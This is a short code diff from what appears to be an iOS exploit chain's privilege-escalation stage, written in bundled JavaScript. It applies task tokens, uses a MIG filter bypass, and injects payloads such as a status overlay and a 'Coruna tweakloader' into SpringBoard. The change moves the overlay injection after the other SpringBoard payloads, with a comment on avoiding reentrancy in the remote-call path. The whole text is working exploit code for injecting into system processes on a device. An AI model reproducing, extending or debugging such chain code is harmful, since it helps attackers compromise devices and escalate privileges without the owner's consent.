@@ -9777,10 +9777,6 @@ function start() { LOG("[+] PE start() called");
 				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
 				LOG("[PE] Agent loader tokens applied; adjusting memory pressure");
 				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
-				if (ENABLE_CHAIN_STATUS_OVERLAY)
-					injectChainStatusOverlay(agentLoader.task, migFilterBypass, agentPid);
-				else
-					LOG("[PE] Chain status overlay disabled");
 				if (ENABLE_CORUNA_TWEAKLOADER)
 					injectCorunaTweakloader(agentLoader.task, migFilterBypass, agentPid);
 				else
@@ -9794,6 +9790,14 @@ function start() { LOG("[+] PE start() called");
 					LOG("[PE] SpringBoard-only mode: waiting " + SBCUST_ONLY_SETTLE_DELAY_USEC.toString() + " usec for async main-thread dispatch to settle");
 					libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", SBCUST_ONLY_SETTLE_DELAY_USEC);
 				}
+				// Inject the status overlay last. Its polling worker keeps a
+				// SpringBoard-side JS context alive, and running it before the
+				// other SpringBoard payloads can starve/reenter the same RemoteCall
+				// path used for the follow-up injection.
+				if (ENABLE_CHAIN_STATUS_OVERLAY)
+					injectChainStatusOverlay(agentLoader.task, migFilterBypass, agentPid);
+				else
+					LOG("[PE] Chain status overlay disabled");
 
 			} else {
 				LOG("[PE] Agent loader inject failed");
